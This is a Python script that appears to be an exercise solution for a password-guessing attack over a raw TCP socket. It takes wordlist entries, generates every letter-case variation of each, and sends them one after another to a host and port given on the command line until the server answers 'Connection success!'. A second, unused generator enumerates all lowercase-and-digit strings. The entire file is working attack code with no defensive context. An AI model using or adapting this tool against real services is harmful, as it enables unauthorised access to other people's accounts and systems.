import sys
import socket
import itertools


def get_bruce_force():
    c = ''.join([chr(c) for c in range(97, 97 + 26)] + [str(c) for c in range(10)])
    pass_dict = []
    while True:
        pass_dict.append(c)
        for p in itertools.product(*pass_dict):
            yield ''.join(p)


def get_pass_variations2(word):
    word_len = len(word)
    word_var = list(zip(word.lower(), word.upper()))
    word_var = [list(set(x)) for x in word_var]
    for v in itertools.product([0, 1], repeat=word_len):
        if any([len(word_var[x[0]]) < x[1] + 1 for x in enumerate(v)]):
            continue
        yield ''.join(c[1][v[c[0]]] for c in enumerate(word_var))


def get_dict_pass(p_file):
    for p in p_file:
        for pv in get_pass_variations2(p.strip()):
            yield pv


password = ''


args = sys.argv
conn = socket.socket()
conn.connect((args[1], int(args[2])))

pass_file = open('../passwords.txt', 'r')
pass_to_try_gen = get_dict_pass(pass_file)
while not password:
    pass_to_try = next(pass_to_try_gen)
    conn.send(pass_to_try.encode())
    serv_resp = conn.recv(50).decode()
    if serv_resp == 'Connection success!':
        password = pass_to_try
        print(password)
        break

pass_file.close()
conn.close()
